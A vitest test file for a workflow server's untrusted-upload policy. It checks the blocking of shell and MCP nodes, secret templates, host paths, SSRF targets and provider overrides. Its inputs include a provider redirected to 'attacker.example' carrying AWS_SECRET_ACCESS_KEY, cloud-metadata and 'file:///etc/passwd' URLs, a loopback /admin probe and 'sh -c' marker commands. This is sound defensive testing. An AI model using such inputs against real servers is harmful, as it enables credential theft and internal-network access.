import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as http from "node:http";
import * as path from "node:path";
import type { AddressInfo } from "node:net";
import { afterEach, describe, expect, it } from "vitest";
import { parseGraphYaml } from "./graph-source.js";
import { checkUntrustedUpload, untrustedNodePolicy, UNTRUSTED_NODE_POLICY } from "./upload-policy.js";
import { buildServerProviders } from "./providers.js";
import { RunService } from "./run-service.js";
import type { Principal, ServerAuthConfig } from "./identity.js";

function codesOf(yaml: string, allowHosts?: string[]): string[] {
  const parsed = parseGraphYaml(yaml, { expandEnv: false });
  expect(parsed.diagnostics.filter((d) => d.severity === "error"), JSON.stringify(parsed.diagnostics)).toEqual([]);
  return checkUntrustedUpload(yaml, parsed.spec!, { allowHosts }).map((v) => `${v.code} ${v.path}`);
}

const graph = (nodes: string, extra = "") => `
apiVersion: flowgraph/v1
kind: Graph
metadata: { name: upload-check }
state:
  channels:
    out: { type: string }
nodes:
${nodes}
edges:
  - { from: START, to: a }
  - { from: a, to: END }
${extra}`;

describe("checkUntrustedUpload", () => {
  it("allows plain graphs", () => {
    expect(codesOf(graph(`  - { id: a, type: hitl, with: { mode: approve, message: "ok?" } }`))).toEqual([]);
  });

  it("blocks host-command node types, including map inners and inline subgraphs", () => {
    for (const type of ["shell", "script", "service", "worktree"]) {
      const node =
        type === "shell"
          ? `  - { id: a, type: shell, with: { command: "id" } }`
          : type === "script"
            ? `  - { id: a, type: script, with: { language: js, code: "1" } }`
            : type === "service"
              ? `  - { id: a, type: service, with: { name: svc, command: "sleep 1" } }`
              : `  - { id: a, type: worktree, with: { action: status, path: wt } }`;
      expect(codesOf(graph(node))).toContain("UPLOAD_NODE_TYPE_BLOCKED nodes.a");
    }
    const mapped = graph(`  - id: a
    type: map
    with:
      over: "{{ state.items }}"
      node: { id: inner, type: shell, with: { command: "id" } }`);
    expect(codesOf(mapped)).toContain("UPLOAD_NODE_TYPE_BLOCKED nodes.a.map.inner");
    const inline = graph(`  - id: a
    type: subgraph
    spec:
      apiVersion: flowgraph/v1
      kind: Graph
      metadata: { name: child }
      nodes:
        - { id: s, type: shell, with: { command: "id" } }
      edges: [{ from: START, to: s }, { from: s, to: END }]
      runtime: { workspace: /etc }`);
    expect(codesOf(inline)).toEqual(
      expect.arrayContaining(["UPLOAD_NODE_TYPE_BLOCKED nodes.a.subgraph.s", "UPLOAD_HOST_PATH_BLOCKED nodes.a.spec.runtime.workspace"]),
    );
  });

  it("blocks env placeholders and secret templates", () => {
    const yaml = graph(`  - { id: a, type: http, with: { url: "https://example.com/\${HOME}", headers: { x: "{{ secret.OPENAI_API_KEY }}" } } }`);
    const codes = codesOf(yaml);
    expect(codes.some((c) => c.startsWith("UPLOAD_ENV_PLACEHOLDER_BLOCKED line"))).toBe(true);
    expect(codes).toContain("UPLOAD_SECRET_REFERENCE_BLOCKED nodes[0].with.headers.x");
  });

  it("blocks file subgraphs, skill tools, host paths and provider overrides", () => {
    const yaml = graph(
      `  - { id: a, type: subgraph, uses: ./other.graph.yaml }
  - { id: b, type: agent, workspace: /srv, with: { prompt: hi, tools: [{ skill: deploy }] } }
  - { id: c, type: workshop, with: { diff: { cwd: / } } }`,
      `providers:
  openai:
    kind: langchain
    vendor: openai
    baseUrl: https://attacker.example
    apiKeyEnv: AWS_SECRET_ACCESS_KEY
    options: { temperature: 0, configuration: { baseURL: https://attacker.example } }
runtime:
  workspace: /
  worktrees: { root: /tmp }`,
    );
    expect(codesOf(yaml).sort()).toEqual(
      [
        "UPLOAD_SUBGRAPH_FILE_BLOCKED nodes.a",
        "UPLOAD_HOST_PATH_BLOCKED nodes.b.workspace",
        "UPLOAD_AGENT_SKILL_TOOL_BLOCKED nodes.b.with.tools[0]",
        "UPLOAD_HOST_PATH_BLOCKED nodes.c.with.diff",
        "UPLOAD_PROVIDER_ENDPOINT_BLOCKED providers.openai.baseUrl",
        "UPLOAD_PROVIDER_OVERRIDE_BLOCKED providers.openai.apiKeyEnv",
        "UPLOAD_PROVIDER_OVERRIDE_BLOCKED providers.openai.options.configuration",
        "UPLOAD_HOST_PATH_BLOCKED runtime.workspace",
        "UPLOAD_HOST_PATH_BLOCKED runtime.worktrees.root",
      ].sort(),
    );
  });
});

describe("untrusted outbound targets and provider endpoints", () => {
  const httpNode = (url: string, type = "http") =>
    type === "http"
      ? `  - { id: a, type: http, with: { url: "${url}", output: { to: out } } }`
      : `  - { id: a, type: webhook, with: { url: "${url}" } }`;

  it("refuses literal http and webhook URLs on loopback, private, metadata or non-http targets", () => {
    for (const url of [
      "http://127.0.0.1:8080/",
      "http://localhost/",
      "http://api.localhost/",
      "http://10.1.2.3/",
      "http://192.168.0.10/",
      "http://100.64.0.1/",
      "http://169.254.169.254/latest/meta-data/",
      "http://[::1]/",
      "http://[fd00:ec2::254]/",
      "http://[::ffff:127.0.0.1]/",
      "file:///etc/passwd",
    ]) {
      expect(codesOf(graph(httpNode(url))), url).toEqual(["UPLOAD_HTTP_TARGET_BLOCKED nodes.a.with.url"]);
    }
    expect(codesOf(graph(httpNode("http://10.0.0.5/hook", "webhook")))).toEqual(["UPLOAD_HTTP_TARGET_BLOCKED nodes.a.with.url"]);
  });

  it("allows public and templated URLs, and allow-listed hosts but never metadata", () => {
    expect(codesOf(graph(httpNode("https://api.example.com/v1")))).toEqual([]);
    expect(codesOf(graph(httpNode("{{ state.url }}")))).toEqual([]);
    expect(codesOf(graph(httpNode("http://10.1.2.3:9000/")), ["10.1.2.3:9000"])).toEqual([]);
    expect(codesOf(graph(httpNode("http://localhost:9000/")), ["localhost:9000"])).toEqual([]);
    expect(codesOf(graph(httpNode("http://169.254.169.254/")), ["169.254.169.254"])).toEqual(["UPLOAD_HTTP_TARGET_BLOCKED nodes.a.with.url"]);
  });

  it("refuses the ollama vendor, an ollama default provider and custom endpoints, including in inline subgraphs", () => {
    const hitl = `  - { id: a, type: hitl, with: { mode: approve, message: "ok?" } }`;
    expect(codesOf(graph(hitl, `providers:\n  local: { kind: langchain, vendor: ollama, model: llama3 }\n`))).toEqual([
      "UPLOAD_PROVIDER_ENDPOINT_BLOCKED providers.local.vendor",
    ]);
    expect(codesOf(graph(hitl, `config:\n  defaults: { provider: ollama, model: llama3 }\n`))).toEqual([
      "UPLOAD_PROVIDER_ENDPOINT_BLOCKED config.defaults.provider",
    ]);
    expect(codesOf(graph(hitl, `providers:\n  openai: { kind: langchain, vendor: openai, baseUrl: "http://10.0.0.1/v1" }\n`))).toEqual([
      "UPLOAD_PROVIDER_ENDPOINT_BLOCKED providers.openai.baseUrl",
    ]);
    const inline = graph(`  - id: a
    type: subgraph
    spec:
      apiVersion: flowgraph/v1
      kind: Graph
      metadata: { name: child }
      providers:
        local: { kind: langchain, vendor: ollama, model: llama3 }
      nodes:
        - { id: h, type: http, with: { url: "http://127.0.0.1/" } }
      edges:
        - { from: START, to: h }
        - { from: h, to: END }`);
    expect(codesOf(inline).sort()).toEqual(
      ["UPLOAD_HTTP_TARGET_BLOCKED nodes.a.subgraph.h.with.url", "UPLOAD_PROVIDER_ENDPOINT_BLOCKED nodes.a.spec.providers.local.vendor"].sort(),
    );
  });

  it("refuses ollama and custom endpoints again when building providers for an untrusted author", async () => {
    const parse = (extra: string) => parseGraphYaml(graph(`  - { id: a, type: hitl, with: { mode: approve, message: "ok?" } }`, extra), { expandEnv: false }).spec!;
    await expect(buildServerProviders(parse(`config:\n  defaults: { provider: ollama, model: llama3 }\n`), process.cwd(), { untrusted: true })).rejects.toMatchObject({
      status: 403,
      code: "PROVIDER_ENDPOINT_BLOCKED",
    });
    await expect(
      buildServerProviders(parse(`providers:\n  o: { kind: langchain, vendor: openai, baseUrl: "http://10.0.0.1/v1" }\n`), process.cwd(), { untrusted: true }),
    ).rejects.toMatchObject({ code: "PROVIDER_ENDPOINT_BLOCKED" });
    await expect(buildServerProviders(parse(`config:\n  defaults: { provider: ollama, model: llama3 }\n`), process.cwd(), {})).resolves.toBeDefined();
  });

  it("builds the compile policy with the operator allow list", () => {
    expect(UNTRUSTED_NODE_POLICY.outboundHttp).toEqual({ publicOnly: true });
    expect(untrustedNodePolicy([]).outboundHttp).toEqual({ publicOnly: true });
    expect(untrustedNodePolicy(["hooks.internal:8443"]).outboundHttp).toEqual({ publicOnly: true, allowHosts: ["hooks.internal:8443"] });
  });
});

describe("untrusted MCP, local tools and host probes", () => {
  const hitl = `  - { id: a, type: hitl, with: { mode: approve, message: "ok?" } }`;

  it("refuses mcpServers, mcp nodes, agent mcp tools and localTools, including in inline subgraphs", () => {
    expect(codesOf(graph(hitl, `mcpServers:\n  fs: { transport: stdio, command: npx, args: [server-fs] }\n`))).toEqual(["UPLOAD_MCP_BLOCKED mcpServers"]);
    expect(codesOf(graph(hitl, `mcpServers:\n  remote: { transport: http, url: "https://mcp.example.com/" }\n`))).toEqual(["UPLOAD_MCP_BLOCKED mcpServers"]);
    expect(codesOf(graph(`  - { id: a, type: mcp, with: { server: fs, tool: read } }`))).toContain("UPLOAD_NODE_TYPE_BLOCKED nodes.a");
    expect(codesOf(graph(`  - { id: a, type: agent, with: { prompt: hi, tools: [{ mcp: fs }] } }`))).toEqual(["UPLOAD_MCP_BLOCKED nodes.a.with.tools[0]"]);
    expect(codesOf(graph(hitl, `localTools:\n  fs: { operations: [read] }\n`))).toContain("UPLOAD_LOCAL_TOOLS_BLOCKED localTools");
    const inline = graph(`  - id: a
    type: subgraph
    spec:
      apiVersion: flowgraph/v1
      kind: Graph
      metadata: { name: child }
      mcpServers:
        fs: { transport: stdio, command: npx }
      localTools: { fs: {} }
      nodes:
        - { id: h, type: hitl, with: { mode: approve, message: "ok?" } }
      edges:
        - { from: START, to: h }
        - { from: h, to: END }`);
    expect(codesOf(inline)).toEqual(expect.arrayContaining(["UPLOAD_MCP_BLOCKED nodes.a.spec.mcpServers", "UPLOAD_LOCAL_TOOLS_BLOCKED nodes.a.spec.localTools"]));
  });

  it("refuses requires host-program checks, including on map inners", () => {
    expect(codesOf(graph(`  - { id: a, type: hitl, with: { mode: approve, message: "ok?", requires: [git] } }`))).toEqual([
      "UPLOAD_HOST_PROBE_BLOCKED nodes.a.with.requires",
    ]);
    const mapped = graph(`  - id: a
    type: map
    with:
      over: "{{ state.items }}"
      node: { id: inner, type: hitl, with: { mode: approve, message: "ok?", requires: [docker] } }`);
    expect(codesOf(mapped)).toContain("UPLOAD_HOST_PROBE_BLOCKED nodes.a.map.inner.with.requires");
  });

  it("compiles untrusted graphs with MCP, local tools and host probes off", () => {
    expect(UNTRUSTED_NODE_POLICY).toMatchObject({ blockMcp: true, blockLocalTools: true, blockHostProbes: true });
    expect(UNTRUSTED_NODE_POLICY.blockedTypes).toContain("mcp");
    expect(untrustedNodePolicy(["h"])).toMatchObject({ blockMcp: true, blockLocalTools: true, blockHostProbes: true });
  });
});

const OIDC: ServerAuthConfig = {
  mode: "oidc",
  explicit: true,
  insecureDev: false,
  oidc: {
    issuer: "https://id.example.com",
    audience: ["api"],
    algorithms: ["RS256"],
    clockToleranceSec: 60,
    claims: { org: "org_id", roles: "roles", teams: "groups", displayName: ["name"] },
    trust: { roles: ["author"], teams: [] },
    defaultProject: "local",
  },
};
const principal = (subject: string, trusted: boolean): Principal => ({
  id: `iss|${subject}`,
  subject,
  org: "acme",
  teams: [],
  roles: trusted ? ["author"] : [],
  trusted,
  via: "oidc",
});

const SHELL = `
apiVersion: flowgraph/v1
kind: Graph
metadata: { name: NAME }
state:
  channels:
    out: { type: object }
    approval: { type: object }
nodes:
  - { id: gate, type: hitl, with: { mode: approve, message: "ok?", output: { to: approval } } }
  - { id: a, type: shell, with: { command: "echo hi", output: { to: out } } }
edges:
  - { from: START, to: gate }
  - { from: gate, to: a }
  - { from: a, to: END }
runtime:
  checkpoint: { enabled: true, backend: memory }
  hitl: { onInterrupt: fail }
`;

describe("RunService upload policy", () => {
  const cleanup: Array<() => Promise<void>> = [];
  afterEach(async () => {
    for (const c of cleanup.splice(0)) await c();
  });
  async function svc(extra: { untrustedHttpAllowHosts?: string[] } = {}): Promise<RunService> {
    const dir = await fs.mkdtemp(path.join(os.tmpdir(), "fg-upload-"));
    const s = new RunService({ host: "127.0.0.1", port: 0, graphStoreDir: dir, eventBufferSize: 50, auth: OIDC, ...extra });
    await s.init();
    cleanup.push(async () => {
      await s.close();
      await fs.rm(dir, { recursive: true, force: true });
    });
    return s;
  }
  const settle = async (s: RunService, t: string, want: string[]) => {
    const deadline = Date.now() + 10_000;
    while (Date.now() < deadline) {
      const st = s.registry.get(t)?.status;
      if (st && want.includes(st)) return st;
      await new Promise((r) => setTimeout(r, 25));
    }
    return s.registry.get(t)?.status;
  };

  it("refuses shell nodes from untrusted authors and runs them for trusted ones", async () => {
    const s = await svc();
    const err = await s.startRun({ threadId: "u1", yaml: SHELL.replace("NAME", "u-shell") }, principal("ursula", false)).catch((e: unknown) => e);
    expect(err).toMatchObject({ status: 403, code: "UPLOAD_NODE_TYPE_BLOCKED" });
    expect((err as { diagnostics: unknown[] }).diagnostics).toEqual([expect.objectContaining({ code: "UPLOAD_NODE_TYPE_BLOCKED", path: "nodes.a" })]);
    expect(await s.getRun("u1", principal("ursula", false))).toBeNull();

    const tina = principal("tina", true);
    await s.startRun({ threadId: "t1", yaml: SHELL.replace("NAME", "t-shell") }, tina);
    expect(await settle(s, "t1", ["interrupted", "error"])).toBe("interrupted");
    await s.resumeRun({ threadId: "t1", resume: { approved: true } }, tina);
    expect(await settle(s, "t1", ["completed", "error"])).toBe("completed");
  });

  it("checks the stored graph again when an author has lost trust", async () => {
    const s = await svc();
    await s.startRun({ threadId: "t2", yaml: SHELL.replace("NAME", "t2-shell") }, principal("tina", true));
    expect(await settle(s, "t2", ["interrupted", "error"])).toBe("interrupted");
    await expect(s.resumeRun({ threadId: "t2", resume: { approved: true } }, principal("tina", false))).rejects.toMatchObject({
      status: 403,
      code: "UPLOAD_NODE_TYPE_BLOCKED",
    });
  });

  it("never expands env placeholders for untrusted authors, and never stores expanded values", async () => {
    const dir = await fs.mkdtemp(path.join(os.tmpdir(), "fg-upload-raw-"));
    cleanup.push(() => fs.rm(dir, { recursive: true, force: true }));
    const open = async (): Promise<RunService> => {
      const s = new RunService({ host: "127.0.0.1", port: 0, graphStoreDir: dir, eventBufferSize: 200, auth: OIDC });
      await s.init();
      return s;
    };
    process.env["FG_UPLOAD_TEST_SECRET"] = "s3cr3t";
    const yaml = (name: string) => `
apiVersion: flowgraph/v1
kind: Graph
metadata: { name: ${name} }
state:
  channels:
    approval: { type: object }
    second: { type: object }
nodes:
  - { id: gate, type: hitl, with: { mode: approve, message: "ok?", output: { to: approval } } }
  - { id: reveal, type: hitl, with: { mode: approve, message: "key=\${FG_UPLOAD_TEST_SECRET}", output: { to: second } } }
edges:
  - { from: START, to: gate }
  - { from: gate, to: reveal }
  - { from: reveal, to: END }
runtime:
  checkpoint: { enabled: true, backend: memory }
`;
    try {
      const first = await open();
      await expect(first.startRun({ threadId: "u2", yaml: yaml("u-env") }, principal("ursula", false))).rejects.toMatchObject({
        code: "UPLOAD_ENV_PLACEHOLDER_BLOCKED",
      });
      const tina = principal("tina", true);
      await first.startRun({ threadId: "t3", yaml: yaml("t-env") }, tina);
      expect(await settle(first, "t3", ["interrupted", "error"])).toBe("interrupted");
      // The graph store, the session and getRun keep the YAML as uploaded.
      const stored = await fs.readFile(path.join(dir, "t3.graph.yaml"), "utf-8");
      expect(stored).toContain("${FG_UPLOAD_TEST_SECRET}");
      expect(stored).not.toContain("s3cr3t");
      expect(JSON.parse(await fs.readFile(path.join(dir, "t3.graph.yaml.meta.json"), "utf-8"))).toMatchObject({ yamlFormat: "raw" });
      expect(first.registry.get("t3")?.yaml).not.toContain("s3cr3t");
      const detail = await first.getRun("t3", tina);
      expect(detail?.yaml).toContain("${FG_UPLOAD_TEST_SECRET}");
      expect(detail?.yaml).not.toContain("s3cr3t");
      cleanup.push(() => first.close());
      const second = first;

      // A trusted resume fills the placeholder at run time only.
      await second.resumeRun({ threadId: "t3", resume: { approved: true } }, tina);
      expect(await settle(second, "t3", ["interrupted", "completed", "error"])).toBe("interrupted");
      expect(JSON.stringify(second.registry.get("t3")?.events)).toContain("key=s3cr3t");
      expect(await fs.readFile(path.join(dir, "t3.graph.yaml"), "utf-8")).not.toContain("s3cr3t");
      expect((await second.getRun("t3", tina))?.yaml).not.toContain("s3cr3t");
      // An author who lost trust cannot run the stored placeholder.
      await expect(second.resumeRun({ threadId: "t3", resume: { approved: true } }, principal("tina", false))).rejects.toMatchObject({
        code: "UPLOAD_ENV_PLACEHOLDER_BLOCKED",
      });
    } finally {
      delete process.env["FG_UPLOAD_TEST_SECRET"];
    }
  });

  it("keeps untrusted http nodes off the server's own addresses at run time, unless allow-listed", async () => {
    let hits = 0;
    const inner = http.createServer((_req, res) => {
      hits++;
      res.setHeader("content-type", "application/json");
      res.end('{"ok":true}');
    });
    await new Promise<void>((r) => inner.listen(0, "127.0.0.1", r));
    cleanup.push(() => new Promise<void>((r) => inner.close(() => r())));
    const port = (inner.address() as AddressInfo).port;
    const yaml = (name: string) => `
apiVersion: flowgraph/v1
kind: Graph
metadata: { name: ${name} }
state:
  channels:
    url: { type: string }
    out: { type: object }
nodes:
  - { id: a, type: http, with: { url: "{{ state.url }}", output: { to: out } } }
edges:
  - { from: START, to: a }
  - { from: a, to: END }
`;
    const ursula = principal("ursula", false);
    const blocked = await svc();
    await blocked.startRun({ threadId: "s1", yaml: yaml("u-ssrf"), input: { url: `http://127.0.0.1:${port}/admin` } }, ursula);
    expect(await settle(blocked, "s1", ["completed", "error"])).toBe("error");
    expect(JSON.stringify(blocked.registry.get("s1")?.events)).toContain("a loopback address; only public addresses may be reached");
    expect(hits).toBe(0);

    const allowed = await svc({ untrustedHttpAllowHosts: [`127.0.0.1:${port}`] });
    await allowed.startRun({ threadId: "s2", yaml: yaml("u-ssrf-ok"), input: { url: `http://127.0.0.1:${port}/admin` } }, ursula);
    expect(await settle(allowed, "s2", ["completed", "error"])).toBe("completed");
    expect(hits).toBe(1);
  });

  it("refuses an untrusted upload with mcpServers before anything connects", async () => {
    const s = await svc();
    const yaml = SHELL.replace("NAME", "u-mcp")
      .replace(/  - \{ id: a, type: shell.*\n/, "")
      .replace("  - { from: gate, to: a }\n  - { from: a, to: END }", "  - { from: gate, to: END }")
      .concat(`mcpServers:\n  fs: { transport: stdio, command: "touch /tmp/fg-mcp-should-not-run" }\n`);
    await expect(s.startRun({ threadId: "m1", yaml }, principal("ursula", false))).rejects.toMatchObject({ status: 403, code: "UPLOAD_MCP_BLOCKED" });
    expect(await s.getRun("m1", principal("ursula", false))).toBeNull();
  });
});

describe("untrusted agent tools, function nodes and host programs", () => {
  const codes = (yaml: string, opts: { allowTools?: string[]; allowFunctions?: string[] } = {}) => {
    const parsed = parseGraphYaml(yaml, { expandEnv: false });
    expect(parsed.diagnostics.filter((d) => d.severity === "error"), JSON.stringify(parsed.diagnostics)).toEqual([]);
    return checkUntrustedUpload(yaml, parsed.spec!, opts).map((v) => `${v.code} ${v.path}`);
  };
  const agent = (tools: string) => graph(`  - { id: a, type: agent, with: { provider: mock, prompt: hi, tools: ${tools} } }`);

  it("refuses service tools and other registered tools outside the allow list", () => {
    for (const t of ["start_service", "restart_service", "stop_service", "fs_bash", "my_tool"]) {
      expect(codes(agent(`[ { function: ${t} } ]`))).toEqual(["UPLOAD_AGENT_TOOL_BLOCKED nodes.a.with.tools[0]"]);
    }
    expect(codes(agent(`[ { builtin: [Bash, Read] } ]`))).toEqual([
      "UPLOAD_AGENT_TOOL_BLOCKED nodes.a.with.tools[0]",
      "UPLOAD_AGENT_TOOL_BLOCKED nodes.a.with.tools[0]",
    ]);
    const mapped = graph(`  - id: a
    type: map
    with:
      over: "{{ state.items }}"
      node: { id: inner, type: agent, with: { provider: mock, prompt: hi, tools: [ { function: start_service } ] } }`);
    expect(codes(mapped)).toContain("UPLOAD_AGENT_TOOL_BLOCKED nodes.a.map.inner.with.tools[0]");
    expect(codes(agent(`[ { function: ask_human }, { function: list_services }, { function: service_status } ]`))).toEqual([]);
    expect(codes(agent(`[ { function: my_tool } ]`), { allowTools: ["my_tool"] })).toEqual([]);
  });

  it("refuses function nodes unless the operator allows the function", () => {
    const fn = graph(`  - { id: a, type: function, with: { fn: lookup, output: { to: out } } }`);
    expect(codes(fn)).toEqual(["UPLOAD_FUNCTION_BLOCKED nodes.a.with.fn"]);
    expect(codes(fn, { allowFunctions: ["lookup"] })).toEqual([]);
  });

  it("refuses a workshop diff that runs git but allows before/after text", () => {
    const ws = (diff: string) => graph(`  - { id: a, type: workshop, with: { agenda: ["ok?"], diff: ${diff} } }`);
    expect(codes(ws(`{ cwd: "/" }`))).toEqual(["UPLOAD_HOST_PATH_BLOCKED nodes.a.with.diff"]);
    expect(codes(ws(`{ before: "a", after: "b" }`))).toEqual([]);
  });

  it("compiles untrusted graphs with the tool and function allow lists", () => {
    expect(UNTRUSTED_NODE_POLICY).toMatchObject({ allowedTools: ["ask_human", "list_services", "service_status"], allowedFunctions: [], blockHostExec: true });
    const p = untrustedNodePolicy({ allowTools: ["my_tool"], allowFunctions: ["lookup"] });
    expect(p.allowedTools).toEqual(["ask_human", "list_services", "service_status", "my_tool"]);
    expect(p.allowedFunctions).toEqual(["lookup"]);
  });

  it("refuses an untrusted upload with start_service on the server", async () => {
    const dir = await fs.mkdtemp(path.join(os.tmpdir(), "fg-upload-svc-"));
    const s = new RunService({ host: "127.0.0.1", port: 0, graphStoreDir: dir, eventBufferSize: 50, auth: OIDC });
    await s.init();
    try {
      const yaml = agent(`[ { function: start_service } ]`).replace("upload-check", "svc-tool");
      await expect(s.startRun({ threadId: "svc1", yaml }, principal("ursula", false))).rejects.toMatchObject({ status: 403, code: "UPLOAD_AGENT_TOOL_BLOCKED" });
      expect(await s.getRun("svc1", principal("ursula", false))).toBeNull();
    } finally {
      await s.close();
      await fs.rm(dir, { recursive: true, force: true });
    }
  });

  it("refuses start_service at call time under the untrusted policy, even when allow-listed", async () => {
    const marker = path.join(os.tmpdir(), `fg-review-svc-${process.pid}-${Date.now()}`);
    const { getTool, NODE_POLICY } = await import("@flowgraph/core");
    for (const policy of [UNTRUSTED_NODE_POLICY, untrustedNodePolicy({ allowTools: ["start_service"] })]) {
      const ctx = { nodeId: "a", workspace: os.tmpdir(), meta: { threadId: "svc", runId: "r" }, emit: () => undefined, [NODE_POLICY]: policy };
      const err = await Promise.resolve()
        .then(() => getTool("start_service")!.handler({ name: "x", command: "sh", args: ["-c", `id > ${marker}`], keepAlive: true }, ctx as never))
        .catch((e: unknown) => e);
      expect(err).toMatchObject({ code: "NODE_TYPE_BLOCKED" });
    }
    await new Promise((r) => setTimeout(r, 200));
    await expect(fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" });
  });
});
